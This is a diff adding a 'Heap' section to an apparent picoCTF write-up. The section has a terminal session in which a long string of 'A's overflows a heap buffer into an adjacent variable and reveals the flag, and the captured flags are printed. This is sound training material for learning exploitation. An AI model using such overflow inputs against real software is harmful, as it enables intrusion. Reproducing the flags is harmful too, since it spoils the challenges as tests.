@@ -145,3 +145,60 @@ picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
 
 
 ***
+# 4. Heap
+> Are overflows just a stack concern?
+Download the binary here.
+Download the source here.
+Connect with the challenge instance here:
+nc tethys.picoctf.net 56915
+## Solution
+
+```
+shaunak@Shaunaks-MacBook-Pro ~ % nc tethys.picoctf.net 56915
+
+Welcome to heap0!
+I put my data on the heap so it should be safe from any tampering.
+Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.
+
+Heap State:
++-------------+----------------+
+[*] Address   ->   Heap Data   
++-------------+----------------+
+[*]   0x555eb4b162b0  ->   pico
++-------------+----------------+
+[*]   0x555eb4b162d0  ->   bico
++-------------+----------------+
+
+1. Print Heap:		(print the current state of the heap)
+2. Write to buffer:	(write to your own personal block of data on the heap)
+3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:		(Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 2
+Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+1. Print Heap:		(print the current state of the heap)
+2. Write to buffer:	(write to your own personal block of data on the heap)
+3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:		(Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 3
+
+
+Take a look at my variable: safe_var = AAAAAAAA
+
+
+1. Print Heap:		(print the current state of the heap)
+2. Write to buffer:	(write to your own personal block of data on the heap)
+3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:		(Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 4
+
+YOU WIN
+picoCTF{my_first_heap_overflow_749119de}
+shaunak@Shaunaks-MacBook-Pro ~ %
+```
